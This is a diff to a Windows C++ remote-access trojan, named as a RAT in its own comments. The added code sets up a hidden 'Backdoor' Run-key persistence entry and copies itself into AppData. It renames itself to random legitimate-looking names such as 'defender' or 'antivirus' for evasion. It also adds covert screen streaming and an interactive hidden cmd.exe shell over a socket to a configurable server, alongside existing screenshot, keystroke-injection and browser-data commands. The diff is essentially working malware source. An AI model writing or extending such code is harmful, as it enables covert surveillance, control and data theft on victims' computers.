@@ -10,17 +10,18 @@
 #include <memory>     // For smart pointers
 #include <tlhelp32.h> // For process management functions
 #include <iphlpapi.h>
-#include <vector>
-#include <map>
+// Removed unused map header
 #include <psapi.h> // For GetModuleFileNameExA
 #include <sstream>
 #include <algorithm>
 #include <cstdint>
+#include <shlobj.h> // For SHGetFolderPath
+#include <direct.h> // For _getcwd
+// Basic headers for RAT functionality
 
 // Link with required libraries
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "iphlpapi.lib") // Link with IP Helper API
 #pragma comment(lib, "psapi.lib")    // Link with psapi library
 
 // Use Gdiplus namespace
@@ -29,6 +30,173 @@ using namespace Gdiplus;
 #define PORT 8888
 #define BUFFER_SIZE 1024
 #define SERVER_IP "127.0.0.1" // Change to your server IP
+
+// Screen sharing globals
+static bool g_screen_sharing_active = false;
+static HANDLE g_screen_sharing_thread = NULL;
+static SOCKET g_screen_sharing_socket = INVALID_SOCKET;
+static CRITICAL_SECTION g_screen_sharing_cs;
+
+// Forward declarations for all functions
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
+void establish_persistence();
+std::string get_sysinfo();
+bool capture_and_send_screenshot(SOCKET sock);
+std::string list_processes();
+DWORD GetActualProcessIdByName(const std::string& processName);
+std::string start_process(const std::string& command);
+HWND FindApplicationWindow(const std::string& processNameOrId);
+std::string send_keystrokes(const std::string& processNameOrId, const std::string& keys);
+std::string click_at_position(const std::string& processName, int x, int y);
+std::string launch_from_start_menu(const std::string& appName);
+std::string send_keystrokes_at_cursor(const std::string& keys);
+void processSpecialKey(const std::string& key, std::vector<INPUT>& inputs);
+std::string open_youtube_without_ads(const std::string& url);
+std::string search_process(const std::string& process_name);
+std::string get_network_info();
+std::string get_system_logs(const char* log_type, int num_entries);
+// Screen sharing function declarations
+bool capture_screen_frame(std::vector<BYTE>& buffer, DWORD& size);
+DWORD WINAPI screen_sharing_thread(LPVOID lpParam);
+std::string start_screen_sharing(SOCKET sock);
+std::string stop_screen_sharing();
+// Removed evasion function declarations
+
+// Simple string encryption for basic obfuscation
+std::string simple_xor_encrypt(const std::string& data, char key) {
+    std::string result = data;
+    for (size_t i = 0; i < result.size(); i++) {
+        result[i] ^= key;
+    }
+    return result;
+}
+
+// Encrypted strings (will be decrypted at runtime)
+namespace encrypted_strings {
+    const char key = 0x7A;
+    
+    std::string get_appdata_filename() {
+        std::string filename = "windows32.exe";
+        return filename; // Simple filename without encryption
+    }
+    
+    std::string get_registry_key() {
+        std::string regkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+        return regkey; // Simple registry key without encryption
+    }
+    
+    std::string get_registry_value() {
+        std::string regvalue = "Backdoor";
+        return regvalue; // Simple registry value without encryption
+    }
+}
+
+// Polymorphic filename generation for evasion
+namespace polymorphic {
+    // Generate a random filename that looks legitimate
+    std::string generate_random_filename() {
+        // Common legitimate-looking filename patterns
+        std::vector<std::string> prefixes = {
+            "windows", "system", "microsoft", "update", "service", "driver", 
+            "security", "defender", "antivirus", "backup", "sync", "cloud",
+            "office", "adobe", "intel", "nvidia", "realtek", "audio"
+        };
+        
+        std::vector<std::string> suffixes = {
+            "32", "64", "service", "helper", "manager", "updater", "sync",
+            "driver", "host", "client", "agent", "monitor", "scanner"
+        };
+        
+        // Use current time as seed for randomization
+        srand((unsigned int)GetTickCount());
+        
+        std::string prefix = prefixes[rand() % prefixes.size()];
+        std::string suffix = suffixes[rand() % suffixes.size()];
+        
+        // Add random number for uniqueness
+        int random_num = rand() % 9999 + 1000;
+        
+        return prefix + suffix + std::to_string(random_num) + ".exe";
+    }
+    
+    // Get the current executable path
+    std::string get_current_exe_path() {
+        char currentPath[MAX_PATH];
+        if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) > 0) {
+            return std::string(currentPath);
+        }
+        return "";
+    }
+    
+    // Get directory of current executable
+    std::string get_current_directory() {
+        std::string currentPath = get_current_exe_path();
+        size_t lastSlash = currentPath.find_last_of("\\/");
+        if (lastSlash != std::string::npos) {
+            return currentPath.substr(0, lastSlash + 1);
+        }
+        return "";
+    }
+    
+    // Check if we're running from AppData (persistence location)
+    bool is_running_from_appdata() {
+        std::string currentPath = get_current_exe_path();
+        std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), ::tolower);
+        return currentPath.find("appdata") != std::string::npos;
+    }
+    
+    // Perform polymorphic replication
+    bool replicate_with_new_name() {
+        if (!is_running_from_appdata()) {
+            return false; // Only replicate when running from persistence location
+        }
+        
+        std::string currentPath = get_current_exe_path();
+        std::string currentDir = get_current_directory();
+        std::string newFilename = generate_random_filename();
+        std::string newPath = currentDir + newFilename;
+        
+        // Don't replicate if we're already using a random name
+        std::string currentFilename = currentPath.substr(currentPath.find_last_of("\\/") + 1);
+        if (currentFilename != "windows32.exe") {
+            return false; // Already polymorphic
+        }
+        
+        // Copy current executable to new filename
+        if (CopyFileA(currentPath.c_str(), newPath.c_str(), FALSE)) {
+            // Update registry to point to new file
+            HKEY hKey;
+            std::string regKey = encrypted_strings::get_registry_key();
+            std::string regValue = encrypted_strings::get_registry_value();
+            
+            LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regKey.c_str(), 0, KEY_SET_VALUE, &hKey);
+            if (result == ERROR_SUCCESS) {
+                RegSetValueExA(hKey, regValue.c_str(), 0, REG_SZ, 
+                              (const BYTE*)newPath.c_str(), newPath.length() + 1);
+                RegCloseKey(hKey);
+            }
+            
+            // Schedule deletion of current file and launch new one
+            std::string batchCmd = "timeout /t 3 /nobreak > nul && del \"" + currentPath + "\" && \"" + newPath + "\"";
+            std::string fullCmd = "cmd /c \"" + batchCmd + "\"";
+            
+            // Launch the batch command and exit current process
+            STARTUPINFOA si = {sizeof(STARTUPINFOA)};
+            PROCESS_INFORMATION pi;
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_HIDE;
+            
+            if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, FALSE, 
+                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                return true; // Signal to exit current process
+            }
+        }
+        
+        return false;
+    }
+}
 
 // Get detailed system information
 std::string get_sysinfo()
@@ -44,8 +212,10 @@ std::string get_sysinfo()
     char ipAddress[46]; // IPv4 or IPv6
     std::string additionalInfo = "";
 
-    // Get computer name
-    GetComputerNameA(computerName, &size);
+    // Get computer name - use correct format specifier for ANSI version
+    if (!GetComputerNameA(computerName, &size)) {
+        strncpy(computerName, "Unknown", sizeof(computerName)-1);
+    }
 
     // Get username
     GetUserNameA(userName, &userSize);
@@ -58,7 +228,17 @@ std::string get_sysinfo()
     osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
 
     // Note: GetVersionEx is deprecated, but still works for basic info
-    GetVersionEx((OSVERSIONINFO *)&osInfo);
+    if (!GetVersionEx((OSVERSIONINFO *)&osInfo)) {
+        // Handle error if GetVersionEx fails
+        osInfo.dwMajorVersion = 0;
+        osInfo.dwMinorVersion = 0;
+        osInfo.dwBuildNumber = 0;
+#ifdef UNICODE
+        wcscpy(osInfo.szCSDVersion, L"Unknown");
+#else
+        strcpy(osInfo.szCSDVersion, "Unknown");
+#endif
+    }
 
     // Get memory info
     memInfo.dwLength = sizeof(MEMORYSTATUSEX);
@@ -79,7 +259,9 @@ std::string get_sysinfo()
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
 
-    getaddrinfo(hostName, NULL, &hints, &res);
+    if (getaddrinfo(hostName, NULL, &hints, &res) != 0) {
+        return ""; // Return empty string on failure
+    }
 
     void *addr;
     if (res->ai_family == AF_INET)
@@ -122,7 +304,11 @@ std::string get_sysinfo()
              "\n=== DETAILED SYSTEM INFORMATION ===\n\n"
              "=== SYSTEM ===\n"
              "OS: Windows %ld.%ld (Build %ld)\n"
-             "Service Pack: %ls\n"
+#ifdef UNICODE
+             "Service Pack: %s\n"
+#else
+             "Service Pack: %s\n"
+#endif
              "Computer Name: %s\n"
              "Username: %s\n\n"
 
@@ -140,17 +326,24 @@ std::string get_sysinfo()
              "Available Virtual Memory: %.2f GB\n\n"
 
              "=== DISK ===\n"
-             "Total Disk Space (C:): %.2f GB\n"
-             "Free Disk Space (C:): %.2f GB\n"
-             "Disk Usage: %.2f%%\n\n"
+             "Disk Space: %.2f GB total / %.2f GB free (%.1f%% used)\n\n"
 
              "=== NETWORK ===\n"
-             "Host Name: %s\n"
              "IP Address: %s\n\n"
              "%s",
 
              osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber,
+#ifdef UNICODE
+             // Convert wide string to narrow string if in Unicode mode
+             [&]() -> std::string {
+                 char narrow_version[128];
+                 WideCharToMultiByte(CP_UTF8, 0, osInfo.szCSDVersion, -1, narrow_version, sizeof(narrow_version), NULL, NULL);
+                 return narrow_version;
+             }().c_str(),
+#else
+             // In ANSI mode, just use the string directly
              osInfo.szCSDVersion,
+#endif
              computerName,
              userName,
 
@@ -160,16 +353,15 @@ std::string get_sysinfo()
              sysInfo.wProcessorRevision,
 
              memInfo.dwMemoryLoad,
-             (double)memInfo.ullTotalPhys / (1024 * 1024 * 1024),
-             (double)memInfo.ullAvailPhys / (1024 * 1024 * 1024),
-             (double)memInfo.ullTotalVirtual / (1024 * 1024 * 1024),
-             (double)memInfo.ullAvailVirtual / (1024 * 1024 * 1024),
+             (double)memInfo.ullTotalPhys / (1024.0 * 1024.0 * 1024.0),
+             (double)memInfo.ullAvailPhys / (1024.0 * 1024.0 * 1024.0),
+             (double)memInfo.ullTotalVirtual / (1024.0 * 1024.0 * 1024.0),
+             (double)memInfo.ullAvailVirtual / (1024.0 * 1024.0 * 1024.0),
 
-             (double)totalBytes.QuadPart / (1024 * 1024 * 1024),
-             (double)totalFreeBytes.QuadPart / (1024 * 1024 * 1024),
+             (double)totalBytes.QuadPart / (1024.0 * 1024.0 * 1024.0),
+             (double)totalFreeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0),
              100.0 - ((double)totalFreeBytes.QuadPart / totalBytes.QuadPart * 100.0),
 
-             hostName,
              ipAddress,
              additionalInfo.c_str());
 
@@ -180,6 +372,8 @@ std::string get_sysinfo()
 // Helper function to get encoder CLSID
 int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
 {
+    if (!format || !pClsid) return -1; // Error if parameters are null
+    
     UINT num = 0;  // number of image encoders
     UINT size = 0; // size of the image encoder array in bytes
 
@@ -233,24 +427,29 @@ bool capture_and_send_screenshot(SOCKET sock)
     // Save bitmap to memory using GDI+
     Bitmap *bitmap = nullptr;
     bitmap = new Bitmap(hBitmap, NULL);
-
     // Create a memory stream
     IStream *stream = nullptr;
     CreateStreamOnHGlobal(NULL, TRUE, &stream);
 
     // Save bitmap to stream as PNG
     CLSID pngClsid;
-    GetEncoderClsid(L"image/png", &pngClsid);
-    bitmap->Save(stream, &pngClsid, NULL);
-
-    // Get stream size and reset position
-    LARGE_INTEGER liZero = {0};
-    ULARGE_INTEGER ulSize;
-    stream->Seek(liZero, STREAM_SEEK_END, &ulSize);
+    int result = GetEncoderClsid(L"image/png", &pngClsid);
+    if (result >= 0) {
+        bitmap->Save(stream, &pngClsid, NULL);
+    } else {
+        // Handle the error
+        std::cerr << "Failed to get encoder CLSID: " << result << std::endl;
+    }
+    
+    // Declare and initialize LARGE_INTEGER for stream seek
+    LARGE_INTEGER liZero;
+    liZero.QuadPart = 0;
     stream->Seek(liZero, STREAM_SEEK_SET, NULL);
-
-    // Get stream data
-    DWORD streamSize = (DWORD)ulSize.QuadPart;
+    
+    // Get stream size
+    STATSTG statStg;
+    stream->Stat(&statStg, STATFLAG_DEFAULT);
+    DWORD streamSize = (DWORD)statStg.cbSize.QuadPart;
     std::vector<BYTE> buffer(streamSize);
     ULONG bytesRead;
     stream->Read(buffer.data(), streamSize, &bytesRead);
@@ -288,6 +487,203 @@ bool capture_and_send_screenshot(SOCKET sock)
 
     return (total_sent == streamSize);
 }
+
+// ============================================================================
+// SCREEN SHARING IMPLEMENTATION
+// ============================================================================
+
+// Capture a single screen frame with JPEG compression for efficient streaming
+bool capture_screen_frame(std::vector<BYTE>& buffer, DWORD& size)
+{
+    // Initialize GDI+ (should already be initialized in main)
+    // Get screen dimensions
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+    // Create compatible DC and bitmap
+    HDC screenDC = GetDC(NULL);
+    HDC memDC = CreateCompatibleDC(screenDC);
+    HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);
+    HBITMAP hOldBitmap = (HBITMAP)SelectObject(memDC, hBitmap);
+
+    // Copy screen to bitmap
+    BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);
+
+    // Create GDI+ bitmap from HBITMAP
+    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
+    
+    // Create a memory stream
+    IStream* stream = nullptr;
+    CreateStreamOnHGlobal(NULL, TRUE, &stream);
+
+    // Save bitmap to stream as JPEG for better compression
+    CLSID jpegClsid;
+    int result = GetEncoderClsid(L"image/jpeg", &jpegClsid);
+    
+    bool success = false;
+    if (result >= 0) {
+        // Set JPEG quality to 75% for good balance between quality and size
+        EncoderParameters encoderParams;
+        encoderParams.Count = 1;
+        encoderParams.Parameter[0].Guid = EncoderQuality;
+        encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
+        encoderParams.Parameter[0].NumberOfValues = 1;
+        ULONG quality = 75;
+        encoderParams.Parameter[0].Value = &quality;
+        
+        if (bitmap->Save(stream, &jpegClsid, &encoderParams) == Ok) {
+            // Get stream size and data
+            LARGE_INTEGER liZero;
+            liZero.QuadPart = 0;
+            stream->Seek(liZero, STREAM_SEEK_SET, NULL);
+            
+            STATSTG statStg;
+            if (stream->Stat(&statStg, STATFLAG_DEFAULT) == S_OK) {
+                size = (DWORD)statStg.cbSize.QuadPart;
+                buffer.resize(size);
+                
+                ULONG bytesRead;
+                if (stream->Read(buffer.data(), size, &bytesRead) == S_OK && bytesRead == size) {
+                    success = true;
+                }
+            }
+        }
+    }
+
+    // Clean up
+    stream->Release();
+    delete bitmap;
+    SelectObject(memDC, hOldBitmap);
+    DeleteObject(hBitmap);
+    DeleteDC(memDC);
+    ReleaseDC(NULL, screenDC);
+
+    return success;
+}
+
+// Screen sharing thread function
+DWORD WINAPI screen_sharing_thread(LPVOID lpParam)
+{
+    SOCKET sock = (SOCKET)(uintptr_t)lpParam;
+    std::vector<BYTE> frameBuffer;
+    DWORD frameSize;
+    
+    // Wait a moment for the main thread to send the confirmation message
+    Sleep(100);
+    
+    // Send screen sharing start marker
+    const char* start_marker = "##SCREEN_SHARE_START##";
+    send(sock, start_marker, strlen(start_marker), 0);
+    
+    while (true) {
+        EnterCriticalSection(&g_screen_sharing_cs);
+        bool should_continue = g_screen_sharing_active;
+        LeaveCriticalSection(&g_screen_sharing_cs);
+        
+        if (!should_continue) {
+            break;
+        }
+        
+        // Capture screen frame
+        if (capture_screen_frame(frameBuffer, frameSize)) {
+            // Send frame size first (4 bytes, little-endian)
+            char sizeBytes[4];
+            sizeBytes[0] = (frameSize) & 0xFF;
+            sizeBytes[1] = (frameSize >> 8) & 0xFF;
+            sizeBytes[2] = (frameSize >> 16) & 0xFF;
+            sizeBytes[3] = (frameSize >> 24) & 0xFF;
+            
+            if (send(sock, sizeBytes, 4, 0) <= 0) {
+                break; // Connection lost
+            }
+            
+            // Send frame data in chunks
+            DWORD totalSent = 0;
+            while (totalSent < frameSize) {
+                DWORD chunkSize = (frameSize - totalSent < 8192) ? (frameSize - totalSent) : 8192; // 8KB chunks
+                int sent = send(sock, (char*)frameBuffer.data() + totalSent, chunkSize, 0);
+                if (sent <= 0) {
+                    goto thread_exit; // Connection lost
+                }
+                totalSent += sent;
+            }
+        }
+        
+        // Control frame rate - aim for ~10 FPS to balance performance and bandwidth
+        Sleep(100);
+    }
+    
+thread_exit:
+    // Send screen sharing end marker
+    const char* end_marker = "##SCREEN_SHARE_END##";
+    send(sock, end_marker, strlen(end_marker), 0);
+    
+    return 0;
+}
+
+// Start screen sharing
+std::string start_screen_sharing(SOCKET sock)
+{
+    EnterCriticalSection(&g_screen_sharing_cs);
+    
+    if (g_screen_sharing_active) {
+        LeaveCriticalSection(&g_screen_sharing_cs);
+        return "Screen sharing is already active";
+    }
+    
+    g_screen_sharing_active = true;
+    g_screen_sharing_socket = sock;
+    
+    LeaveCriticalSection(&g_screen_sharing_cs);
+    
+    // Create screen sharing thread
+    g_screen_sharing_thread = CreateThread(
+        NULL,                   // default security attributes
+        0,                      // use default stack size  
+        screen_sharing_thread,  // thread function name
+        (LPVOID)(uintptr_t)sock, // argument to thread function 
+        0,                      // use default creation flags 
+        NULL                    // returns the thread identifier 
+    );
+    
+    if (g_screen_sharing_thread == NULL) {
+        EnterCriticalSection(&g_screen_sharing_cs);
+        g_screen_sharing_active = false;
+        LeaveCriticalSection(&g_screen_sharing_cs);
+        return "Failed to create screen sharing thread";
+    }
+    
+    return "Screen sharing started successfully - streaming at 10 FPS with JPEG compression";
+}
+
+// Stop screen sharing
+std::string stop_screen_sharing()
+{
+    EnterCriticalSection(&g_screen_sharing_cs);
+    
+    if (!g_screen_sharing_active) {
+        LeaveCriticalSection(&g_screen_sharing_cs);
+        return "Screen sharing is not active";
+    }
+    
+    g_screen_sharing_active = false;
+    LeaveCriticalSection(&g_screen_sharing_cs);
+    
+    // Wait for thread to finish (with timeout)
+    if (g_screen_sharing_thread != NULL) {
+        WaitForSingleObject(g_screen_sharing_thread, 2000); // 2 second timeout
+        CloseHandle(g_screen_sharing_thread);
+        g_screen_sharing_thread = NULL;
+    }
+    
+    g_screen_sharing_socket = INVALID_SOCKET;
+    
+    return "Screen sharing stopped successfully";
+}
+
+// ============================================================================
+// END SCREEN SHARING IMPLEMENTATION
+// ============================================================================
 
 // List all running processes
 std::string list_processes()
@@ -571,7 +967,6 @@ std::string start_process(const std::string &command)
 
         return "Process started successfully with PID: " + std::to_string(initialPid);
     }
-
     return "Failed to start process: " + std::to_string(error) +
            " (Command: " + processCommand + ")";
 }
@@ -579,29 +974,175 @@ std::string start_process(const std::string &command)
 // Terminate a process by PID
 std::string terminate_process(const std::string &pid_str)
 {
-    try
+    DWORD pid = std::stoi(pid_str);
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+
+    if (hProcess == NULL)
     {
-        DWORD pid = std::stoi(pid_str);
-        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+        return "Failed to open process with PID " + pid_str + ": " + std::to_string(GetLastError());
+    }
 
-        if (hProcess == NULL)
-        {
-            return "Failed to open process with PID " + pid_str + ": " + std::to_string(GetLastError());
-        }
-
-        if (!TerminateProcess(hProcess, 1))
-        {
-            CloseHandle(hProcess);
-            return "Failed to terminate process with PID " + pid_str + ": " + std::to_string(GetLastError());
-        }
-
+    if (!TerminateProcess(hProcess, 1))
+    {
         CloseHandle(hProcess);
-        return "Process with PID " + pid_str + " terminated successfully";
+        return "Failed to terminate process with PID " + pid_str + ": " + std::to_string(GetLastError());
     }
-    catch (const std::exception &e)
+
+    CloseHandle(hProcess);
+    return "Process with PID " + pid_str + " terminated successfully";
+}
+
+// Interactive shell execution with real-time output streaming
+bool interactive_shell(SOCKET sock)
+{
+    // Create pipes for stdin, stdout, stderr
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    HANDLE hStdOutRd = NULL;
+    HANDLE hStdOutWr = NULL;
+    HANDLE hStdInRd = NULL;
+    HANDLE hStdInWr = NULL;
+    HANDLE hStdErrWr = NULL;
+
+    // Create stdout pipe
+    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0))
     {
-        return "Error: " + std::string(e.what());
+        return false;
     }
+
+    // Create stdin pipe
+    if (!CreatePipe(&hStdInRd, &hStdInWr, &sa, 0))
+    {
+        CloseHandle(hStdOutRd);
+        CloseHandle(hStdOutWr);
+        return false;
+    }
+
+    // Create stderr pipe (redirect to stdout)
+    hStdErrWr = hStdOutWr;
+
+    // Set the inheritance properties
+    SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(hStdInWr, HANDLE_FLAG_INHERIT, 0);
+
+    // Start the command processor
+    PROCESS_INFORMATION pi;
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+
+    si.cb = sizeof(STARTUPINFO);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdInput = hStdInRd;
+    si.hStdOutput = hStdOutWr;
+    si.hStdError = hStdErrWr;
+    si.wShowWindow = SW_HIDE;
+
+    // Start cmd.exe
+    char cmdLine[] = "cmd.exe";
+    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        CloseHandle(hStdOutRd);
+        CloseHandle(hStdOutWr);
+        CloseHandle(hStdInRd);
+        CloseHandle(hStdInWr);
+        return false;
+    }
+
+    // Close unnecessary handles
+    CloseHandle(hStdOutWr);
+    CloseHandle(hStdInRd);
+    CloseHandle(pi.hThread);
+
+    // Send shell start marker
+    const char* shell_start = "##SHELL_SESSION_STARTED##";
+    send(sock, shell_start, strlen(shell_start), 0);
+
+    // Create a thread to read from the socket and write to the process stdin
+    HANDLE hReadThread = CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
+        auto params = static_cast<std::pair<SOCKET, HANDLE>*>(param);
+        SOCKET clientSock = params->first;
+        HANDLE hStdInWr = params->second;
+        
+        char buffer[4096];
+        int bytesReceived;
+        
+        while (true) {
+            // Receive command from server
+            bytesReceived = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
+            if (bytesReceived <= 0) {
+                break;
+            }
+            
+            buffer[bytesReceived] = '\0';
+            
+            // Check for exit command
+            if (strcmp(buffer, "exit_shell") == 0) {
+                // Send exit command to cmd.exe
+                const char* exitCmd = "exit\r\n";
+                DWORD bytesWritten;
+                WriteFile(hStdInWr, exitCmd, strlen(exitCmd), &bytesWritten, NULL);
+                break;
+            }
+            
+            // Add newline to command
+            std::string command = buffer;
+            command += "\r\n";
+            
+            // Write to process stdin
+            DWORD bytesWritten;
+            if (!WriteFile(hStdInWr, command.c_str(), command.length(), &bytesWritten, NULL)) {
+                break;
+            }
+        }
+        
+        delete params;
+        return 0;
+    }, new std::pair<SOCKET, HANDLE>(sock, hStdInWr), 0, NULL);
+
+    // Read from process stdout and send to socket
+    char buffer[4096];
+    DWORD bytesRead;
+    
+    // Send initial prompt
+    const char* prompt = "\r\nC:\\> ";
+    send(sock, prompt, strlen(prompt), 0);
+    
+    while (true) {
+        // Check if process is still running
+        DWORD exitCode;
+        if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
+            break;
+        }
+        
+        // Read from stdout
+        if (!ReadFile(hStdOutRd, buffer, sizeof(buffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
+            if (GetLastError() == ERROR_BROKEN_PIPE) {
+                break; // Pipe closed
+            }
+            Sleep(50);
+            continue;
+        }
+        
+        // Send to socket
+        buffer[bytesRead] = '\0';
+        send(sock, buffer, bytesRead, 0);
+    }
+    
+    // Clean up
+    CloseHandle(hReadThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(hStdOutRd);
+    CloseHandle(hStdInWr);
+    
+    // Send shell end marker
+    const char* shell_end = "##SHELL_SESSION_ENDED##";
+    send(sock, shell_end, strlen(shell_end), 0);
+    
+    return true;
 }
 
 // Add this new function to get installed software
@@ -704,12 +1245,10 @@ HWND FindApplicationWindow(const std::string &processNameOrId)
     bool isPid = true;
     DWORD targetPid = 0;
 
-    try
-    {
-        targetPid = std::stoul(processNameOrId);
-    }
-    catch (...)
-    {
+    // Try to convert to PID, if it fails, it's a process name
+    char* endptr;
+    targetPid = strtoul(processNameOrId.c_str(), &endptr, 10);
+    if (*endptr != '\0') {
         isPid = false;
     }
 
@@ -1879,8 +2418,66 @@ std::string get_browser_data()
     return result;
 }
 
+// Function to establish persistence
+void establish_persistence()
+{
+    // Get AppData path
+    char appDataPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) != S_OK)
+    {
+        return; // Silently fail if we can't get AppData path
+    }
+
+    // Use simple filename
+    std::string filename = encrypted_strings::get_appdata_filename();
+    std::string targetLocation = std::string(appDataPath) + "\\" + filename;
+
+    // Get current executable path
+    char currentExePath[MAX_PATH];
+    if (GetModuleFileNameA(NULL, currentExePath, MAX_PATH) == 0)
+    {
+        return; // Silently fail if we can't get current exe path
+    }
+
+    // Check if file already exists at target location
+    if (GetFileAttributesA(targetLocation.c_str()) == INVALID_FILE_ATTRIBUTES)
+    {
+        // File doesn't exist, try to copy it
+        CopyFileA(currentExePath, targetLocation.c_str(), FALSE);
+        // Continue regardless of success/failure
+    }
+
+    // Always try to add registry entry for persistence
+    HKEY hKey;
+    std::string regKey = encrypted_strings::get_registry_key();
+    std::string regValue = encrypted_strings::get_registry_value();
+    
+    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
+                               regKey.c_str(), 
+                               0, KEY_SET_VALUE, &hKey);
+    
+    if (result == ERROR_SUCCESS)
+    {
+        // Set the registry value
+        RegSetValueExA(hKey, regValue.c_str(), 0, REG_SZ, 
+                      (const BYTE*)targetLocation.c_str(), 
+                      targetLocation.length() + 1);
+        RegCloseKey(hKey);
+    }
+}
+
 int main()
 {
+    // Establish persistence first
+    establish_persistence();
+    
+    // Perform polymorphic replication (change filename after restart)
+    if (polymorphic::replicate_with_new_name()) {
+        // If replication successful, exit current process
+        // New process will be launched automatically
+        return 0;
+    }
+    
     // Initialize GDI+ at startup
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
@@ -1889,6 +2486,9 @@ int main()
     gdiplusStartupInput.SuppressBackgroundThread = FALSE;
     gdiplusStartupInput.SuppressExternalCodecs = FALSE;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+    // Initialize critical section for screen sharing
+    InitializeCriticalSection(&g_screen_sharing_cs);
 
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
@@ -2068,6 +2668,20 @@ int main()
                 }
                 std::cout << "Screenshot sent" << std::endl;
             }
+            else if (strcmp(buffer, "start_screen_share") == 0)
+            {
+                std::cout << "Starting screen sharing..." << std::endl;
+                response = start_screen_sharing(sock);
+                send(sock, response.c_str(), response.length(), 0);
+                std::cout << "Screen sharing command processed: " << response << std::endl;
+            }
+            else if (strcmp(buffer, "stop_screen_share") == 0)
+            {
+                std::cout << "Stopping screen sharing..." << std::endl;
+                response = stop_screen_sharing();
+                send(sock, response.c_str(), response.length(), 0);
+                std::cout << "Screen sharing stopped: " << response << std::endl;
+            }
             else if (strcmp(buffer, "kill_client") == 0)
             {
                 std::cout << "Received kill command from server. Terminating..." << std::endl;
@@ -2098,11 +2712,26 @@ int main()
                 // Break out of the inner loop to attempt reconnection
                 break;
             }
-            else if (strcmp(buffer, "get_installed_software") == 0)
+            else if (strcmp(buffer, "shell") == 0)
             {
-                std::cout << "Getting installed software..." << std::endl;
-                response = get_installed_software();
+                std::cout << "Starting interactive shell session..." << std::endl;
+                
+                // Send acknowledgment
+                response = "Starting interactive shell...";
                 send(sock, response.c_str(), response.length(), 0);
+                
+                // Start interactive shell
+                interactive_shell(sock);
+                
+                // Continue normal operation after shell exits
+                std::cout << "Interactive shell session ended" << std::endl;
+            }
+            else if (strcmp(buffer, "kill_client") == 0)
+            {
+                std::cout << "Received kill command, exiting..." << std::endl;
+                response = "Client shutting down";
+                send(sock, response.c_str(), response.length(), 0);
+                break;
             }
             else if (strcmp(buffer, "installed_software") == 0)
             {
@@ -2182,60 +2811,24 @@ int main()
             else if (strncmp(buffer, "type ", 5) == 0)
             {
                 std::string keys = buffer + 5;
-
-                // Trim leading and trailing whitespace
                 keys.erase(0, keys.find_first_not_of(" \t\r\n"));
                 keys.erase(keys.find_last_not_of(" \t\r\n") + 1);
 
                 std::cout << "Sending keystrokes to current focus: " << keys << std::endl;
 
-                try
-                {
-                    response = send_keystrokes_at_cursor(keys);
-                    send(sock, response.c_str(), response.length(), 0);
-                }
-                catch (const std::exception &e)
-                {
-                    std::string error_msg = "Error sending keystrokes: ";
-                    error_msg += e.what();
-                    std::cout << error_msg << std::endl;
-                    send(sock, error_msg.c_str(), error_msg.length(), 0);
-                }
-                catch (...)
-                {
-                    std::string error_msg = "Unknown error occurred while sending keystrokes";
-                    std::cout << error_msg << std::endl;
-                    send(sock, error_msg.c_str(), error_msg.length(), 0);
-                }
+                response = send_keystrokes_at_cursor(keys);
+                send(sock, response.c_str(), response.length(), 0);
             }
             else if (strncmp(buffer, "youtube ", 8) == 0)
             {
                 std::string url = buffer + 8;
-
-                // Trim leading and trailing whitespace
                 url.erase(0, url.find_first_not_of(" \t\r\n"));
                 url.erase(url.find_last_not_of(" \t\r\n") + 1);
 
                 std::cout << "Opening YouTube URL: " << url << std::endl;
 
-                try
-                {
-                    response = open_youtube_without_ads(url);
-                    send(sock, response.c_str(), response.length(), 0);
-                }
-                catch (const std::exception &e)
-                {
-                    std::string error_msg = "Error opening YouTube URL: ";
-                    error_msg += e.what();
-                    std::cout << error_msg << std::endl;
